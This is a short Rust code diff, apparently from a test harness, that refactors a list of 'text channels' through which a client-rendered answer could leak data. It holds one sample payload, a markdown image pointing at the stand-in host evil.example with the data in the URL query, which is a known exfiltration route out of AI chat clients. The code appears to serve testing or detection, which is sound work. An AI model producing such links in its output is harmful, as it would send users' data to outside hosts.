@@ -261,7 +261,9 @@ fn channels() -> Vec<Channel> {
 }
 
 /// Answers whose text could be rendered by a client: images and links to a foreign host.
-fn text_channels() -> Vec<(&'static str, fn(&str) -> String)> {
+type TextChannel = (&'static str, fn(&str) -> String);
+
+fn text_channels() -> Vec<TextChannel> {
     vec![
         ("markdown image", |m| {
             format!("Готово. ![i](https://evil.example/p.png?d={m})")
